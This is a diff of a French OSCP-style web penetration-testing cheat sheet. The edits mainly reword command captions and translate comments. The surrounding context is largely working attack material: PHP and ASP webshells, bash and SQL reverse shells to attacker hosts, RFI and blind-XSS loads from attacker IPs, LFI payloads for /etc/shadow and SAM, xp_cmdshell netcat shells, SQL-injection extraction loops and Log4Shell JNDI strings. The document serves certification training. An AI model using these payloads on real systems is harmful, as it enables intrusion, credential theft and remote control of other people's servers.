@@ -61,7 +61,7 @@ curl -I http://[TARGET_IP]
 #### FFUF
 
 
-<p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
+<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>
 
 ```bash
 # Fuzzing de répertoire de base
@@ -251,7 +251,7 @@ wfuzz --hc 404 -c -t <number_of_threads> -w /usr/share/dirbuster/wordlists/direc
 #### FFUF
 
 
-<p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
+<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>
 
 ```bash
 # Fuzzing de fichier de base
@@ -530,7 +530,7 @@ wpscan -u "http://<IP>/" --username <username> -w /usr/share/SecList/Usernames/x
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « CMS ».</p>
+<p class="oscp-command-note">WordPress : référence de l'outil et exemple d'appel de wordpwn.py, à adapter au laboratoire.</p>
 
 ```bash
 # Utilisation d'un plugin WordPress malveillant
@@ -653,7 +653,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.as
 ```
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">WebDAV : envoyer un fichier par HTTP PUT avec curl -T et des identifiants autorisés.</p>
 
 ```bash
 curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
@@ -661,7 +661,7 @@ curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
 ```
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
+<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>
 
 ```bash
 nc -nvlp 80
@@ -675,7 +675,7 @@ nc -nvlp 80
 ### Interfaces de programmation (API)
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">API : interroger le point d'entrée et examiner les chemins JSON retournés.</p>
 
 ```bash
 # Exploration API de base
@@ -741,7 +741,7 @@ curl -D <ENTETES>.txt -o <REPONSE>.json 'https://<HOTE_CIBLE>/api/'
 `/usr/share/seclists/Discovery/Web-Content/big.txt`  
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Listes de mots».</p>
 
 ```bash
 # Obtenir le contenu du site
@@ -788,7 +788,7 @@ Examiner les entrées et les réponses de l'application web.
 ### XSS stockée (Stored XSS)
 
 
-<p class="oscp-command-note">Extrait HTML lié à « Stored ».</p>
+<p class="oscp-command-note">Extrait HTML : exemple technique pour «XSS stockée (Stored XSS)» (ce n'est pas une commande de terminal).</p>
 
 ```html
 # Texte à enregistrer dans l'application.
@@ -819,7 +819,7 @@ http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/s
 ### XSS aveugle (Blind XSS)
 
 
-<p class="oscp-command-note">Extrait HTML lié à « Blind ».</p>
+<p class="oscp-command-note">Extrait HTML : exemple technique pour «XSS aveugle (Blind XSS)» (ce n'est pas une commande de terminal).</p>
 
 ```html
 <script src=http://[OUR_IP]></script>
@@ -879,7 +879,7 @@ if (isset($_GET['c'])) {
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Extrait PHP lié à « Wordpress HttpOnly Cookie (Visitor Plugin) ».</p>
+<p class="oscp-command-note">Extrait PHP : exemple technique pour «Cookie HttpOnly dans WordPress (extension Visitor)» (ce n'est pas une commande de terminal).</p>
 
 ```php
 var request = new XMLHttpRequest();
@@ -913,7 +913,7 @@ request.send(params);
 ```
 
 
-<p class="oscp-command-note">Extrait JavaScript lié à « Wordpress HttpOnly Cookie (Visitor Plugin) ».</p>
+<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Cookie HttpOnly dans WordPress (extension Visitor)» (ce n'est pas une commande de terminal).</p>
 
 ```javascript
 function toJavaScriptEncoding(str) {
@@ -937,7 +937,7 @@ console.log(encodedPayload);
 `eval`  
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">HTTP : acheminer la requête par un proxy.</p>
 
 ```bash
 curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
@@ -964,7 +964,7 @@ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 `user-agent`  
 
 
-<p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
+<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>
 
 ```bash
 # [xss.req] est la requête capturée dans BurpSuite.
@@ -989,7 +989,7 @@ Examiner les entrées et les réponses de l'application web.
 
 
 <p class="oscp-inline-ref"><strong>URL de référence :</strong> <code>http://&lt;target_url&gt;/file.php?recurse=&lt;file_name&gt;</code></p>
-<p class="oscp-command-note">Rechercher des chemins ou paramètres web avec FFUF.</p>
+<p class="oscp-command-note">ffuf : rechercher les chemins et fichiers avec la liste de mots indiquée.</p>
 
 ```bash
 ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
@@ -1057,13 +1057,13 @@ http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
 # Double URL encoding
 http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd
 
-# Repeated slashes bypass
+# Contournement par répétition des barres obliques
 http://<target_url>/file.php?recurse=....//....//....//etc/passwd
 
 # Affichage d'un fichier avec injection d'octet nul
 http://<target_url>/file.php?recurse=../../../../../etc/passwd%00
 
-# Bypass file extension restrictions
+# Tester les restrictions d'extensions de fichiers
 http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg
 
 # Récupérer les variables d'environnement du système
@@ -1092,7 +1092,7 @@ http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<fi
 ```
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Flux d’accès aux fichiers via LFI (Wrappers)».</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -1148,9 +1148,9 @@ telnet <target_ip> 25
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Mail PHP Execution (RCE via Email) ».</p>
+<p class="oscp-command-note">Dialogue SMTP dans une session Telnet déjà connectée, pas des commandes Bash.</p>
 
-```bash
+```text
 HELO localhost
 MAIL FROM:<root>
 RCPT TO:<www-data>
@@ -1203,7 +1203,7 @@ git clone https://github.com/D35m0nd142/LFISuite
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Exécuter rfiscanner.py avec les paramètres indiqués pour «Outils utiles».</p>
 
 ```bash
 python rfiscanner.py <target_url>
@@ -1242,7 +1242,7 @@ http://<target_url>/file.php?recurse=http://<attacker_ip>/malicious.php
 #### Shell inversé via RFI
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>
 
 ```bash
 python3 -m http.server 80
@@ -1254,19 +1254,19 @@ python3 -m http.server 80
 `revshell.php`  
 
 
-<p class="oscp-command-note">Extrait de code serveur lié à « Reverse Shell via RFI ».</p>
+<p class="oscp-command-note">Exemples distincts : code PHP du serveur et commande Bash du terminal.</p>
 
-```bash
-# Option 1: Reverse Shell via PHP
+```text
+# Option 1 : exemple de shell inversé via PHP.
 <?php system($_GET['cmd']); ?>
 
-# Option 2: Reverse Shell via Bash
+# Option 2 : exemple de shell inversé via Bash.
 bash -c "sh -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1"
 
 ```
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Shell inversé via RFI».</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
@@ -1289,7 +1289,7 @@ curl "http://<TARGET>/index.php?page=http://<ATTACKER_IP>/revshell.php&cmd=ls"
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Extrait PHP lié à « PHP Webshell ».</p>
+<p class="oscp-command-note">Extrait PHP : exemple technique pour «Webshell PHP» (ce n'est pas une commande de terminal).</p>
 
 ```php
 <?php system($_GET['cmd']); ?>
@@ -1302,7 +1302,7 @@ Examiner les entrées et les réponses de l'application web.
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Extrait de code serveur lié à « ASP Webshell ».</p>
+<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Webshell ASP» (ne pas exécuter comme une commande).</p>
 
 ```text
 <% eval request('cmd') %>
@@ -1337,7 +1337,7 @@ Examiner les permissions et la configuration de Linux.
 /var/www/html/wp-config.php       # WordPress configuration
 /proc/self/environ                # Environment variables (can contain session tokens)
 
-# Additional Options
+# Autres chemins possibles
 /etc/passwd
 /etc/shadow
 /etc/hosts
@@ -1364,21 +1364,20 @@ Examiner les permissions et la configuration de Linux.
 
 #### Fichiers Windows courants
 
-Observer les permissions et la configuration de Windows.
+Ces chemins sont des **valeurs de test pour une inclusion de fichiers (LFI)**, pas des commandes à saisir. Les permissions peuvent empêcher leur lecture.
 
+<p class="oscp-command-note">Chemins Windows à examiner dans un test LFI (liste de fichiers, pas de commandes).</p>
 
-<p class="oscp-command-note">Chemins Windows utiles pour analyser une inclusion de fichiers.</p>
-
-```bash
+```text
 # Fichiers couramment recherchés
-C:\Windows\System32\drivers\etc\hosts          # Hosts file
-C:\xampp\apache\logs\access.log                # Apache access logs
-C:\xampp\php\php.ini                           # PHP configuration file
-C:\Users\Administrator\NTUser.dat              # Windows user data
-C:\Windows\System32\config\SAM                 # Security Account Manager database (passwords)
-C:\Windows\System32\winevt\Logs\Security.evtx  # Security event logs
+C:\Windows\System32\drivers\etc\hosts          # Fichier hosts
+C:\xampp\apache\logs\access.log                # Journaux d'accès Apache
+C:\xampp\php\php.ini                           # Configuration PHP
+C:\Users\Administrator\NTUser.dat              # Données du profil utilisateur
+C:\Windows\System32\config\SAM                 # Base SAM des comptes locaux
+C:\Windows\System32\winevt\Logs\Security.evtx  # Journaux d'événements de sécurité
 
-# Additional Options
+# Autres chemins possibles
 C:\Apache\conf\httpd.conf
 C:\Apache\logs\access.log
 C:\Apache\logs\error.log
@@ -1466,7 +1465,7 @@ Examiner les entrées et les réponses de l'application web.
 `php://filter`  
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Flux PHP (PHP Wrappers)».</p>
 
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
@@ -1486,7 +1485,7 @@ echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 ```bash
 curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"
 
-# Encode PHP payload in base64:
+# Encoder la charge utile PHP en Base64.
 echo -n '<?php echo system($_GET["cmd"]); ?>' | base64
 
 ```
@@ -1570,13 +1569,13 @@ Examiner les entrées et les réponses de l'application web.
 ### Extensions autorisées (liste d’autorisation)
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Extensions Whitelist ».</p>
+<p class="oscp-command-note">PHP : filtrer les extensions par suffixe ; ce contrôle ne prouve pas que le contenu est une image.</p>
 
-```bash
+```php
 # Ceci ne vérifie que si la liste blanche est là dans le fichier de téléchargement et non si elle se termine avec elle.
 $fileName = basename($_FILES["uploadFile"]["name"]);
 
-if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
+if (!preg_match('/\.(?:jpe?g|png|gif)$/i', $fileName)) {
     echo "Only images are allowed";
     die();
 }
@@ -1615,7 +1614,7 @@ AddType application/x-httpd-php .dork
 `.dork`  
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 # Nous pouvons maintenant télécharger des fichiers [file].dork.
@@ -1659,7 +1658,7 @@ if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Bypassing Filters ».</p>
+<p class="oscp-command-note">Bash : générer des variantes de caractères et extensions pour tester un filtre de fichiers.</p>
 
 ```bash
 # Script pour toutes les permutations
@@ -1675,10 +1674,10 @@ done
 ```
 
 
-<p class="oscp-command-note">Extrait PHP lié à « Bypassing Filters ».</p>
+<p class="oscp-command-note">Extrait PHP : exemple technique pour «Contournement des filtres» (ce n'est pas une commande de terminal).</p>
 
 ```php
-# Payload code
+# Code de la charge utile
 GIF89a;
 <?
 system($_GET['cmd']);//or you can insert your complete shell code
@@ -1692,23 +1691,30 @@ system($_GET['cmd']); //or you can insert your complete shell code
 ```
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
-# Exemple
-echo "GIF8" > text.jpg 
+# Sur Linux : créer un fichier d'essai et examiner son type déclaré.
+echo "GIF8" > text.jpg
 file text.jpg
+```
 
+**Exemple de réponse de l'outil file :**
+
+```text
 text.jpg: GIF image data
+```
 
-# Code to Test MIME type of uplaoded file
+**Code PHP côté serveur :**
+
+```php
+// Le type MIME détecté ne suffit pas à confirmer la sécurité du fichier.
 $type = mime_content_type($_FILES['uploadFile']['tmp_name']);
 
 if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
     echo "Only images are allowed";
     die();
 }
-
 ```
 
 ![MIME Spoofing](https://www.emmanuelsolis.com/img/php_filters01.png)
@@ -1764,7 +1770,7 @@ file$(whoami).jpg
 <p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>file.jpg||whoami</code></p>
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Encoder ou décoder les données au format Base64.</p>
 
 ```text
 # Créez la commande encodée Base64.
@@ -1813,7 +1819,7 @@ mysql -u <username> -p -h <host>
 ##### Requêtes courantes
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Requêtes courantes».</p>
 
 ```sql
 SELECT VERSION();
@@ -1857,7 +1863,7 @@ SHOW COLUMNS FROM <table_name>;
 ##### Énumération des utilisateurs et privilèges
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Énumération des utilisateurs et privilèges».</p>
 
 ```sql
 SELECT User, Host FROM mysql.user;
@@ -1876,7 +1882,7 @@ SHOW GRANTS FOR '<username>'@'<host>';
 ##### Extraction de données
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Extraction de données».</p>
 
 ```sql
 SELECT * FROM <table_name> LIMIT <number_of_rows>;
@@ -1903,7 +1909,7 @@ CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 ```
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Exécution de commandes via les fonctions définies par l’utilisateur (UDF)».</p>
 
 ```sql
 SELECT sys_exec('id');
@@ -1914,7 +1920,7 @@ SELECT sys_exec('id');
 ##### Shell inversé (Reverse Shell)
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
+<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>
 
 ```bash
 nc -lvnp 4444
@@ -1922,7 +1928,7 @@ nc -lvnp 4444
 ```
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Shell inversé (Reverse Shell)».</p>
 
 ```sql
 SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
@@ -2021,7 +2027,7 @@ CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 ```
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Obtenir une bibliothèque .so pour une UDF».</p>
 
 ```sql
 SELECT sys_exec('id');
@@ -2053,7 +2059,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ##### Connexion initiale
 
 
-<p class="oscp-command-note">Commande Impacket dans la rubrique « Connexion initiale ».</p>
+<p class="oscp-command-note">MSSQL : se connecter à l'instance SQL avec le compte autorisé.</p>
 
 ```bash
 # Conseil : vous pouvez également spécifier un domaine en utilisant <domain>/<username>:<password>@<host>.
@@ -2065,7 +2071,7 @@ impacket-mssqlclient <username>:<password>@<host> -windows-auth
 ##### Requêtes courantes
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Requêtes courantes».</p>
 
 ```sql
 SELECT @@version;
@@ -2090,7 +2096,7 @@ USE <database_name>;
 ##### Énumération des tables et colonnes
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Énumération des tables et colonnes».</p>
 
 ```sql
 # Astuce : remplacer <schema> par le nom actuel du schéma (communément dbo).
@@ -2108,7 +2114,7 @@ SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '
 ##### Énumération des utilisateurs et privilèges
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Énumération des utilisateurs et privilèges».</p>
 
 ```sql
 SELECT * FROM <schema>.dbo.sysusers;
@@ -2125,7 +2131,7 @@ SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SE
 ##### Extraction de données
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Extraction de données».</p>
 
 ```sql
 SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
@@ -2157,7 +2163,7 @@ EXEC xp_cmdshell 'whoami';
 `xp_cmdshell`  
 
 
-<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
+<p class="oscp-command-note">Netcat : lancer l'écoute locale sur le port de test.</p>
 
 ```bash
 # Setup the listener
@@ -2196,7 +2202,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">Exemple de sql pour «Fonctions SQL courantes».</p>
 
 ```sql
 LIMIT <row offset>, <number of rows>  -- Display rows based on offset and number
@@ -2298,7 +2304,7 @@ wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « UNION-Based Payloads ».</p>
+<p class="oscp-command-note">URL de référence liée à «Charges utiles fondées sur UNION (UNION-Based)» (pas une commande de terminal).</p>
 
 ```bash
 # MySQL
@@ -2480,7 +2486,7 @@ http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
 `SUBSTRING`  
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">URL de référence liée à «Extraire les informations de la base» (pas une commande de terminal).</p>
 
 ```sql
 # MySQL
@@ -2511,7 +2517,7 @@ http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a
 ##### Extraire les noms des tables et colonnes
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">URL de référence liée à «Extraire les noms des tables et colonnes» (pas une commande de terminal).</p>
 
 ```sql
 # MySQL
@@ -2540,7 +2546,7 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.colum
 `SUBSTRING`  
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">URL de référence liée à «Extraire les données» (pas une commande de terminal).</p>
 
 ```sql
 # MySQL
@@ -2631,10 +2637,10 @@ http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELA
 `wfuzz`  
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Time-Based ».</p>
+<p class="oscp-command-note">SQLi temporelle : boucle de requêtes wfuzz pour observer les différences de réponse.</p>
 
 ```bash
-# Uses ASCII value extraction to determine each character of the database name
+# Utilise les valeurs ASCII pour retrouver les caractères du nom de la base.
 for i in $(seq 1 10); do 
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
@@ -2653,7 +2659,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 
 
 ```bash
-# Uses ASCII value extraction to determine each character of the first table name
+# Utilise les valeurs ASCII pour retrouver les caractères du nom de la première table.
 for i in $(seq 1 10); do 
   wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
 done > <filename.txt> && grep "0m9" <filename.txt
@@ -2677,7 +2683,7 @@ for i in $(seq 1 10); do
 done > <filename.txt> && grep "0m9" <filename.txt
 
 # Remplacer <table_name> par le nom de la table que vous ciblez.
-# Adjust LIMIT 0,1 to retrieve column names for different tables.
+# Adapter LIMIT 0,1 pour examiner d'autres lignes et colonnes.
 
 ```
 
@@ -2706,7 +2712,7 @@ done > <filename.txt> && grep "0m9" <filename.txt
 #### Commandes de contournement d’authentification
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">Exemple de sql pour «Commandes de contournement d’authentification».</p>
 
 ```sql
 -- Variante utilisant une condition OR
@@ -2762,7 +2768,7 @@ meh' OR 1=1;--
 #### Exemple de code vulnérable
 
 
-<p class="oscp-command-note">Extrait PHP lié à « Vulnerable Code Example ».</p>
+<p class="oscp-command-note">Extrait PHP : exemple technique pour «Exemple de code vulnérable» (ce n'est pas une commande de terminal).</p>
 
 ```php
 <?php
@@ -2827,7 +2833,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 ##### Commandes courantes
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Commandes courantes».</p>
 
 ```sql
 SELECT name FROM master.dbo.sysdatabases
@@ -2884,7 +2890,7 @@ EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
 ##### Exemples d'instructions SQL
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">Exemple de sql pour «Exemples d'instructions SQL».</p>
 
 ```sql
 -- Examiner la requête SQL et adapter la valeur de test
@@ -2961,7 +2967,7 @@ EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [ka
 ##### Usurpation de contexte (Impersonation)
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Usurpation de contexte (Impersonation)».</p>
 
 ```sql
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
@@ -3052,7 +3058,7 @@ SELECT * FROM <table_name>;
 ```
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «Commandes courantes».</p>
 
 ```sql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
@@ -3097,7 +3103,7 @@ FLUSH PRIVILEGES;
 `mysql`  
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">Exemple de sql pour «Exécution de code à distance (RCE)».</p>
 
 ```sql
 -- Exemple générique
@@ -3131,7 +3137,7 @@ admin ' OR 1=1 --
 ```
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">Exemple de sql pour «Commandes courantes».</p>
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
@@ -3159,7 +3165,7 @@ admin ' OR 1=1 --
 `dual`  
 
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">Exemple de sql pour «Commandes courantes».</p>
 
 ```sql
 ' UNION SELECT 1,2,3,4,5 FROM dual-- 
@@ -3316,7 +3322,7 @@ version="1.0"/encoding="UTF-8"
 `/etc/passwd`  
 
 
-<p class="oscp-command-note">Extrait XML lié à « Reading Sensitive Files ».</p>
+<p class="oscp-command-note">Extrait XML : exemple technique pour «Lecture de fichiers sensibles» (ce n'est pas une commande de terminal).</p>
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -3421,7 +3427,7 @@ version="1.0"/encoding="UTF-8"
 ### Énumération
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Énumération ».</p>
+<p class="oscp-command-note">Chemins de référence à examiner pour «Énumération» (pas une commande).</p>
 
 ```bash
 # UID=1
@@ -3470,7 +3476,7 @@ done
 ### Requêtes AJAX
 
 
-<p class="oscp-command-note">Extrait JavaScript lié à « AJAX Calls ».</p>
+<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Requêtes AJAX» (ce n'est pas une commande de terminal).</p>
 
 ```javascript
 // Exemple de code
@@ -3502,7 +3508,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 <p class="oscp-inline-ref"><strong>Exemple de valeur web :</strong> <code>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</code></p>
 
 
-<p class="oscp-command-note">Extrait JavaScript lié à « Hashing &amp; Encoding ».</p>
+<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Hachage et encodage» (ce n'est pas une commande de terminal).</p>
 
 ```javascript
 $.ajax({
@@ -3746,7 +3752,7 @@ $()
 #### Contournement du filtrage de / et \
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Afficher les valeurs ou chaînes utilisées dans «Contournement du filtrage de / et \».</p>
 
 ```bash
 # pour sélectionner /
@@ -3767,7 +3773,7 @@ $env:HOMEPATH[0]
 #### Contournement des commandes interdites
 
 
-<p class="oscp-command-note">Extrait JavaScript lié à « Commandes are Blacklisted ».</p>
+<p class="oscp-command-note">Extrait JAVASCRIPT : exemple technique pour «Contournement des commandes interdites» (ce n'est pas une commande de terminal).</p>
 
 ```javascript
 $blacklist = ['whoami', 'cat', ...SNIP...];
@@ -3821,7 +3827,7 @@ Example:
 #### Commandes inversées
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Afficher les valeurs ou chaînes utilisées dans «Commandes inversées».</p>
 
 ```bash
 # Linux
@@ -3833,7 +3839,7 @@ $(rev<<<'imaohw')
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Reverse Commandes ».</p>
+<p class="oscp-command-note">PowerShell : reconstruire une chaîne inversée, puis examiner son exécution.</p>
 
 ```powershell
 # Windows
@@ -3848,7 +3854,7 @@ iex "$('imaohw'[-1..-20] -join '')"
 #### Commandes encodées
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Encoder ou décoder les données au format Base64.</p>
 
 ```bash
 # Linux
@@ -3860,7 +3866,7 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Encoded Commandes ».</p>
+<p class="oscp-command-note">PowerShell : encoder une commande en Unicode/Base64 et reconstruire sa valeur.</p>
 
 ```powershell
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
@@ -3924,19 +3930,19 @@ curl -G --data-urlencode 'param=;id' 'http://<HOTE_LABORATOIRE>/test'
 ## Log4Shell
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Log4Shell ».</p>
+<p class="oscp-command-note">Chaînes JNDI LDAP/RMI de démonstration à placer dans un champ du laboratoire, pas dans Bash.</p>
 
-```bash
-# LDAP Payload
+```text
+# Charge utile LDAP
 ${jndi:ldap://attacker-server.com:1389/a}
 
-# RMI Payload
+# Charge utile RMI
 ${jndi:rmi://attacker-server.com:1099/a}
 
 ```
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">Log4Shell : placer une chaîne JNDI dans l'URL ou l'en-tête User-Agent d'une requête GET.</p>
 
 ```bash
 # Utilisation de Curl
